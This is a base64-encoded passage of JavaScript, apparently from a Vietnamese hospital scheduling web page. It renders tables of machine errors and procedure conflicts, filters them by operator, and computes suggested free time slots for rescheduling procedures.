Db2RlfTwvdGQ+YCA6ICcnfQ0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2MucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke3Byb2MucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtwcm9jLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2MucHJvY2VkdXJlfTwvdGQ+DQoJCQkJIDx0ZD48Y2VudGVyPiR7Y29uZmxpY3QuZGF0ZX0gPGJyLz4ke3Byb2MuZGlzcGxheVN0YXJ0fSDihpIgJHtwcm9jLmRpc3BsYXlFbmR9PC9jZW50ZXI+PC90ZD4NCgkJCQkgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7cHJvYy5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAke2luZGV4ID09PSAwID8gYDx0ZCByb3dzcGFuPSIke2NvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5sZW5ndGh9IiBjbGFzcz0idGltZS1zdWdnZXN0aW9uIiBpZD0ibWFjaGluZVN1Z2dlc3Rpb24tJHtjb25mbGljdC5tYWNoaW5lQ29kZX0tJHtjb25mbGljdC5kYXRlfSI+DQogICAgICAgICAgDQogICAgICAgICAgICA8L3RkPmAgOiAnJ30NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfSk7DQogICAgICAgIGh0bWwgKz0gYDx0cj48dGQgY29sc3Bhbj0iJHtzaG93RG9jdG9yID8gJzcnIDogJzYnfSIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD48L3RyPmA7DQogICAgICAgIC8vIFRow6ptIGTDsm5nIHBow6JuIGPDoWNoIGdp4buvYSBjw6FjIG5ow7NtIHh1bmcgxJHhu5l0DQogICAgICAgIGh0bWwgKz0gYDx0cj48dGQgY29sc3Bhbj0iNSIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD48L3RyPmA7DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgbWFjaGluZUNvbmZsaWN0TG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQogICAgbWFjaGluZUNvbmZsaWN0U2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMNCiAgICB1cGRhdGVNYWNoaW5lQ29uZmxpY3RPcGVyYXRvckZpbHRlcigpOw0KCQ0KCSAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGdlbmVyYXRlTWFjaGluZVRpbWVTdWdnZXN0aW9ucygpOw0KICAgIH0sIDEwMCk7DQoJDQp9DQoNCi8vIEPhuq1wIG5o4bqtdCBkcm9wZG93biBs4buNYyBjaG8gbOG7l2kgbcOheQ0KZnVuY3Rpb24gdXBkYXRlTWFjaGluZU9wZXJhdG9yRmlsdGVyKCkgew0KICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KG1hY2hpbmVFcnJvckxvZy5tYXAoZXJyb3IgPT4gZXJyb3Iub3BlcmF0b3IpKV07DQogICAgY29uc3Qgb3BlcmF0b3JTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZU9wZXJhdG9yU2VsZWN0Jyk7DQogICAgDQogICAgb3BlcmF0b3JTZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKyANCiAgICAgICAgb3BlcmF0b3JzLm1hcChvcCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtvcH0iPiR7b3AucmVwbGFjZSgvLC9nLCAnJyl9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVPcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSBvcGVyYXRvcnMubGVuZ3RoID4gMCA/ICdibG9jaycgOiAnbm9uZSc7DQp9DQoNCi8vIEPhuq1wIG5o4bqtdCBkcm9wZG93biBs4buNYyBjaG8geHVuZyDEkeG7mXQgbcOheQ0KZnVuY3Rpb24gdXBkYXRlTWFjaGluZUNvbmZsaWN0T3BlcmF0b3JGaWx0ZXIoKSB7DQogICAgY29uc3Qgb3BlcmF0b3JzID0gWy4uLm5ldyBTZXQobWFjaGluZUNvbmZsaWN0TG9nLmZsYXRNYXAoY29uZmxpY3QgPT4gDQogICAgICAgIGNvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5tYXAocHJvYyA9PiBwcm9jLm9wZXJhdG9yKQ0KICAgICkpXTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lQ29uZmxpY3RPcGVyYXRvclNlbGVjdCcpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsgDQogICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lQ29uZmxpY3RPcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSBvcGVyYXRvcnMubGVuZ3RoID4gMCA/ICdibG9jaycgOiAnbm9uZSc7DQp9DQoNCi8vIEzhu41jIGzhu5dpIG3DoXkgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duDQpmdW5jdGlvbiBmaWx0ZXJNYWNoaW5lRXJyb3JzQnlPcGVyYXRvcigpIHsNCiAgICBjb25zdCBvcGVyYXRvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lT3BlcmF0b3JTZWxlY3QnKS52YWx1ZTsNCiAgICBjb25zdCBmaWx0ZXJlZEVycm9ycyA9IG9wZXJhdG9yID09PSAnYWxsJyANCiAgICAgICAgPyBtYWNoaW5lRXJyb3JMb2cgDQogICAgICAgIDogbWFjaGluZUVycm9yTG9nLmZpbHRlcihlcnJvciA9PiBlcnJvci5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykpOw0KICAgIA0KICAgIGRpc3BsYXlGaWx0ZXJlZE1hY2hpbmVFcnJvcnMoZmlsdGVyZWRFcnJvcnMpOw0KfQ0KDQovLyBM4buNYyB4dW5nIMSR4buZdCBtw6F5IHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbg0KZnVuY3Rpb24gZmlsdGVyTWFjaGluZUNvbmZsaWN0c0J5T3BlcmF0b3IoKSB7DQogICAgY29uc3Qgb3BlcmF0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QnKS52YWx1ZTsNCiAgICBjb25zdCBmaWx0ZXJlZENvbmZsaWN0cyA9IG9wZXJhdG9yID09PSAnYWxsJyANCiAgICAgICAgPyBtYWNoaW5lQ29uZmxpY3RMb2cgDQogICAgICAgIDogbWFjaGluZUNvbmZsaWN0TG9nLmZpbHRlcihjb25mbGljdCA9PiANCiAgICAgICAgICAgIGNvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5zb21lKHByb2MgPT4gDQogICAgICAgICAgICAgICAgcHJvYy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykNCiAgICAgICAgICAgICkNCiAgICAgICAgKTsNCiAgICANCiAgICBkaXNwbGF5RmlsdGVyZWRNYWNoaW5lQ29uZmxpY3RzKGZpbHRlcmVkQ29uZmxpY3RzKTsNCiAgICANCiAgICAvLyBH4buNaSBs4bqhaSBow6BtIHThuqFvIGfhu6NpIMO9IGdp4budIHNhdSBraGkgbOG7jWMNCiAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgZ2VuZXJhdGVNYWNoaW5lVGltZVN1Z2dlc3Rpb25zKCk7DQogICAgfSwgMTAwKTsNCn0NCg0KLy8gSGnhu4NuIHRo4buLIGzhu5dpIG3DoXkgxJHDoyBs4buNYw0KZnVuY3Rpb24gZGlzcGxheUZpbHRlcmVkTWFjaGluZUVycm9ycyhmaWx0ZXJlZEVycm9ycykgew0KICAgIGNvbnN0IG1hY2hpbmVFcnJvckxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lRXJyb3JMb2cnKTsNCiAgICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogICAgaWYgKGZpbHRlcmVkRXJyb3JzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBtYWNoaW5lRXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgZ+G6r24gc2FpIG3DoXkgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCgkJCQk8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1taWNyb2NoaXAgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE3DoyBtw6F5PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgZmlsdGVyZWRFcnJvcnMuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtlcnJvci5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnByb2NlZHVyZX08L3RkPg0KCQkJPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7ZXJyb3IuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IuZGF0ZX08YnIvPiR7ZXJyb3Iuc3RhcnRUaW1lfSDihpIgJHtlcnJvci5lbmRUaW1lfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5tYWNoaW5lQ29kZX08L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0gPCEtLSDEkMOjIMSRxrDhu6NjIGPhuq1wIG5o4bqtdCB24bubaSB0aMO0bmcgYsOhbyBj4bulIHRo4buDIC0tPg0KICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgPC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIG1hY2hpbmVFcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KfQ0KDQovLyBIaeG7g24gdGjhu4sgeHVuZyDEkeG7mXQgbcOheSDEkcOjIGzhu41jDQpmdW5jdGlvbiBkaXNwbGF5RmlsdGVyZWRNYWNoaW5lQ29uZmxpY3RzKGZpbHRlcmVkQ29uZmxpY3RzKSB7DQogICAgY29uc3QgbWFjaGluZUNvbmZsaWN0TG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdExvZycpOw0KICAgICBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgZG9jdG9yQ29sdW1uU3R5bGUgPSBzaG93RG9jdG9yID8gJycgOiAnZGlzcGxheTpub25lJzsNCiAgICBpZiAoZmlsdGVyZWRDb25mbGljdHMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1hY2hpbmVDb25mbGljdExvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyB4dW5nIMSR4buZdCBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtbWljcm9jaGlwIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBNw6F5PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KCQkJCTx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCgkJCQkgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEfhu6NpIMO9IGdp4budPC90aD4NCgkJCQkgDQoJCQkJIA0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgZmlsdGVyZWRDb25mbGljdHMuZm9yRWFjaChjb25mbGljdCA9PiB7DQogICAgICAgIC8vIFRow6ptIGTDsm5nIHRow7RuZyB0aW4gduG7gSBtw6F5IHbDoCBuZ8OgeSB4dW5nIMSR4buZdA0KICAgICAgLy8gIGh0bWwgKz0gYA0KICAgICAgLy8gIDx0ciBjbGFzcz0iZXJyb3Itcm93IiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogI2ZmZjNjZDsiPg0KICAgICAgICAvLyAgICA8dGQgY29sc3Bhbj0iNSIgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsgZm9udC13ZWlnaHQ6IGJvbGQ7IGNvbG9yOiAjODU2NDA0OyI+DQogICAgICAgIC8vICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIj48L2k+IA0KICAgICAgICAgIC8vICAgICAgWFVORyDEkOG7mFQgTcOBWTogJHtjb25mbGljdC5tYWNoaW5lQ29kZX0gLSBOR8OAWTogJHtjb25mbGljdC5kYXRlfQ0KICAgICAgICAgLy8gICA8L3RkPg0KICAgICAgLy8gIDwvdHI+YDsNCiAgICAgICAgDQogICAgICAgIGNvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5mb3JFYWNoKChwcm9jLCBpbmRleCkgPT4gew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgJHtpbmRleCA9PT0gMCA/IGA8dGQgcm93c3Bhbj0iJHtjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMubGVuZ3RofSI+JHtjb25mbGljdC5tYWNoaW5lQ29kZX08L3RkPmAgOiAnJ30NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtwcm9jLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7cHJvYy5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7Y29uZmxpY3QuZGF0ZX08YnIvPiR7cHJvYy5kaXNwbGF5U3RhcnR9IOKGkiAke3Byb2MuZGlzcGxheUVuZH08L2NlbnRlcj48L3RkPg0KCQkJCTx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke3Byb2MuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2Mub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAke2luZGV4ID09PSAwID8gYDx0ZCByb3dzcGFuPSIke2NvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5sZW5ndGh9IiBjbGFzcz0idGltZS1zdWdnZXN0aW9uIiBpZD0ibWFjaGluZVN1Z2dlc3Rpb24tJHtjb25mbGljdC5tYWNoaW5lQ29kZX0tJHtjb25mbGljdC5kYXRlfSI+DQogICAgICAgICAgICAgICAgICAgIDwhLS0gR+G7o2kgw70gZ2nhu50gc+G6vSDEkcaw4bujYyBj4bqtcCBuaOG6rXQgc2F1IC0tPg0KICAgICAgICAgICAgICAgIDwvdGQ+YCA6ICcnfSAgICAgICAgICANCg0KDQoJCSAgPC90cj5gOw0KICAgICAgICB9KTsNCiAgICAgICAgaHRtbCArPSBgPHRyPjx0ZCBjb2xzcGFuPSIke3Nob3dEb2N0b3IgPyAnNycgOiAnNid9IiBjbGFzcz0iZ3JvdXAtc2VwYXJhdG9yIj48L3RkPjwvdHI+YDsNCiANCiAgICAgICAgaHRtbCArPSBgPHRyPjx0ZCBjb2xzcGFuPSI1IiBjbGFzcz0iZ3JvdXAtc2VwYXJhdG9yIj48L3RkPjwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBtYWNoaW5lQ29uZmxpY3RMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCn0NCg0KDQovLy9H4bujaSDDvSBnaeG7nSB4dW5nIMSR4buZdCBtw6F5Ly8vLy8NCi8vIEjDoG0gdOG6oW8gZ+G7o2kgw70gZ2nhu50gY2hvIHh1bmcgxJHhu5l0IG3DoXkNCmZ1bmN0aW9uIGdlbmVyYXRlTWFjaGluZVRpbWVTdWdnZXN0aW9ucygpIHsNCiAgICBjb25zdCB0aW1lT3B0aW9uID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignaW5wdXRbbmFtZT0idGltZU9wdGlvbiJdOmNoZWNrZWQnKS52YWx1ZTsNCiAgICBjb25zdCBzdGFydEhvdXIgPSB0aW1lT3B0aW9uID09PSAnNzozMCcgPyA3LjUgOiA3Ow0KICAgIGNvbnN0IHNob3dNb3JlU3VnZ2VzdGlvbnMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd01vcmVTdWdnZXN0aW9uc0NoZWNrYm94JykuY2hlY2tlZDsNCiAgICANCiAgICAvLyBT4buRIGtodW5nIGdp4budIHThu5FpIMSRYSBt4buXaSBideG7lWkNCiAgICBjb25zdCBtYXhNb3JuaW5nID0gc2hvd01vcmVTdWdnZXN0aW9ucyA/IDMgOiAyOw0KICAgIGNvbnN0IG1heEFmdGVybm9vbiA9IHNob3dNb3JlU3VnZ2VzdGlvbnMgPyAzIDogMTsNCg0KICAgIG1hY2hpbmVDb25mbGljdExvZy5mb3JFYWNoKGNvbmZsaWN0ID0+IHsNCiAgICAgICAgY29uc3QgcHJvY2VkdXJlcyA9IGNvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlczsNCiAgICAgICAgY29uc3QgbWFjaGluZUNvZGUgPSBjb25mbGljdC5tYWNoaW5lQ29kZTsNCiAgICAgICAgY29uc3QgZGF0ZSA9IGNvbmZsaWN0LmRhdGU7DQogICAgICAgIA0KICAgICAgICAvLyBM4bqleSB04bqldCBj4bqjIHRo4bunIHRodeG6rXQgY8O5bmcgbmfDoHksIGPDuW5nIG3DoXkNCiAgICAgICAgY29uc3Qgc2FtZU1hY2hpbmVQcm9jZWR1cmVzID0gZ2V0QWxsUHJvY2VkdXJlc0Zvck1hY2hpbmUobWFjaGluZUNvZGUsIGRhdGUpOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSB0cuG7kW5nIGNobyB04burbmcgdGjhu6cgdGh14bqtdCB0cm9uZyB4dW5nIMSR4buZdA0KICAgICAgICBwcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgICAgICBjb25zdCBkdXJhdGlvblNlY29uZHMgPSBwcm9jLmVuZCAtIHByb2Muc3RhcnQ7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIFTDrG0ga2h1bmcgZ2nhu50gYnXhu5VpIHPDoW5nDQogICAgICAgICAgICBjb25zdCBtb3JuaW5nU2xvdHMgPSBmaW5kQXZhaWxhYmxlTWFjaGluZVNsb3RzKA0KICAgICAgICAgICAgICAgIHN0YXJ0SG91ciAqIDM2MDAsIA0KICAgICAgICAgICAgICAgIDExLjUgKiAzNjAwLCANCiAgICAgICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgICAgIHNhbWVNYWNoaW5lUHJvY2VkdXJlcywNCiAgICAgICAgICAgICAgICBwcm9jZWR1cmVzLCAvLyBsb+G6oWkgdHLhu6sgY8OhYyB0aOG7pyB0aHXhuq10IMSRYW5nIHh1bmcgxJHhu5l0DQogICAgICAgICAgICAgICAgbWF4TW9ybmluZywNCiAgICAgICAgICAgICAgICBwcm9jLm9wZXJhdG9yLA0KICAgICAgICAgICAgICAgIGRhdGUNCiAgICAgICAgICAgICk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIFTDrG0ga2h1bmcgZ2nhu50gYnXhu5VpIGNoaeG7gXUNCiAgICAgICAgICAgIGNvbnN0IGFmdGVybm9vblNsb3RzID0gZmluZEF2YWlsYWJsZU1hY2hpbmVTbG90cygNCiAgICAgICAgICAgICAgICAxMy41ICogMzYwMCwgDQogICAgICAgICAgICAgICAgMTcgKiAzNjAwLCANCiAgICAgICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgICAgIHNhbWVNYWNoaW5lUHJvY2VkdXJlcywNCiAgICAgICAgICAgICAgICBwcm9jZWR1cmVzLA0KICAgICAgICAgICAgICAgIG1heEFmdGVybm9vbiwNCiAgICAgICAgICAgICAgICBwcm9jLm9wZXJhdG9yLA0KICAgICAgICAgICAgICAgIGRhdGUNCiAgICAgICAgICAgICk7DQoNCiAgICAgICAgICAgIC8vIEZvcm1hdCBr4bq/dCBxdeG6ow0KICAgICAgICAgICAgbGV0IHN1Z2dlc3Rpb25zID0gW107DQogICAgICAgICAgICBpZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgICAgICBzdWdnZXN0aW9ucy5wdXNoKCc8c3Ryb25nPlPDoW5nOjwvc3Ryb25nPjxicj4nICsgDQogICAgICAgICAgICAgICAgICAgIG1vcm5pbmdTbG90cy5tYXAoc2xvdCA9PiBgJHtzbG90LnN0YXJ0fSAtICR7c2xvdC5lbmR9YCkuam9pbignPGJyPicpKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChhZnRlcm5vb25TbG90cy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICAgICAgc3VnZ2VzdGlvbnMucHVzaCgnPHN0cm9uZz5DaGnhu4F1Ojwvc3Ryb25nPjxicj4nICsgDQogICAgICAgICAgICAgICAgICAgIGFmdGVybm9vblNsb3RzLm1hcChzbG90ID0+IGAke3Nsb3Quc3RhcnR9IC0gJHtzbG90LmVuZH1gKS5qb2luKCc8YnI+JykpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAvLyBMxrB1IGfhu6NpIMO9DQogICAgICAgICAgICBwcm9jLm1hY2hpbmVTdWdnZXN0aW9uID0gc3VnZ2VzdGlvbnMubGVuZ3RoID4gMCA/IHN1Z2dlc3Rpb25zLmpvaW4oJzxicj4nKSA6IA0KICAgICAgICAgICAgICAgICc8c3BhbiBjbGFzcz0ibm8tc3VnZ2VzdGlvbiI+S2jDtG5nIGPDsyBraHVuZyBnaeG7nSB0cuG7kW5nPC9zcGFuPic7DQogICAgICAgIH0pOw0KDQogICAgICAgIC8vIEPhuq1wIG5o4bqtdCBVSQ0KICAgICAgICB1cGRhdGVNYWNoaW5lU3VnZ2VzdGlvblVJKG1hY2hpbmVDb2RlLCBkYXRlLCBwcm9jZWR1cmVzKTsNCiAgICB9KTsNCn0NCg0KLy8gSMOgbSBs4bqleSB04bqldCBj4bqjIHRo4bunIHRodeG6rXQgY8O5bmcgbcOheSwgY8O5bmcgbmfDoHkNCmZ1bmN0aW9uIGdldEFsbFByb2NlZHVyZXNGb3JNYWNoaW5lKG1hY2hpbmVDb2RlLCBkYXRlKSB7DQogICAgY29uc3QgYWxsUHJvY3MgPSBbXTsNCiAgICANCiAgICBtYWNoaW5lQ29uZmxpY3RMb2cuZm9yRWFjaChjb25mbGljdCA9PiB7DQogICAgICAgIGlmIChjb25mbGljdC5tYWNoaW5lQ29kZSA9PT0gbWFjaGluZUNvZGUgJiYgY29uZmxpY3QuZGF0ZSA9PT0gZGF0ZSkgew0KICAgICAgICAgICAgYWxsUHJvY3MucHVzaCguLi5jb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMpOw0KICAgICAgICB9DQogICAgfSk7DQogICAgDQogICAgLy8gVGjDqm0gY8OhYyB0aOG7pyB0aHXhuq10IGtow7RuZyB4dW5nIMSR4buZdCBuaMawbmcgY8O5bmcgbcOheSwgbmfDoHkNCiAgICBpZiAod2luZG93LmFsbFByb2NlZHVyZXMpIHsNCiAgICAgICAgd2luZG93LmFsbFByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgICAgIGlmIChwcm9jLm1hY2hpbmVDb2RlID09PSBtYWNoaW5lQ29kZSAmJiBwcm9jLmRhdGUgPT09IG